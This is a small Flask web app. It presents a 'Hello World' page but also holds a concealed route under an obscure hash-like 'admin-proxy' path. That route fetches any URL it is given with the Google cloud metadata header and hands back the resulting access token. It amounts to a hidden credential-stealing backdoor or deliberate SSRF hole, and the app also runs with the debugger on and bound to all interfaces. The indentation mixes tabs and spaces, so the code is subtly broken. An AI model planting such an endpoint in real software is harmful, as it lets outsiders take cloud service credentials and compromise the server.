from flask import Flask, redirect, request, url_for, render_template
import requests

app = Flask(__name__)

@app.route('/')
def page():
    return "Hello World!"

@app.route('/admin-proxy-aaf4c61ddcc5e8a2dabede0f3b482cd9aea9434d')
def proxy():
    if 'url' not in request.args:
        return render_template('proxy.html')
    else:
	metadata_url = request.args['url']
	token = requests.get(metadata_url, headers={'Metadata-Flavor': 'Google'}).json()['access_token']
        return token 

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=80, debug=True)
